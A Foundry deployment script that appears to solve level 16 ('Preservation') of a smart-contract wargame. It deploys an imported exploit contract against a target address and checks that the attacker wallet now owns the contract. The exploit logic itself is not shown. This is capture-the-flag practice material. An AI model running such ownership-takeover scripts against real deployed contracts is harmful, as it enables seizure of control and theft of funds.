pragma solidity ^0.8.14;

import {Script} from "forge-std/Script.sol";
import {VmSafe} from "forge-std/Vm.sol";
import {Preservation} from "../src/Level16.sol";
import {PreservationExploit} from "../src/Level16Exploit.sol";

contract Level16Script is Script {
    function run() public {
        VmSafe.Wallet memory wallet = vm.createWallet(vm.envUint("PRIVATE_KEY"));

        address payable contractAddress = payable(vm.envAddress("CONTRACT"));

        vm.startBroadcast(wallet.privateKey);
        exploit(contractAddress);
        vm.stopBroadcast();

        require(levelDone(contractAddress, wallet.addr), "Solution failed");
    }

    function exploit(address _target) private {
        PreservationExploit e = new PreservationExploit();
        e.exploit(_target);
    }

    function levelDone(address _target, address _attacker) private view returns (bool) {
        return Preservation(_target).owner() == _attacker;
    }
}
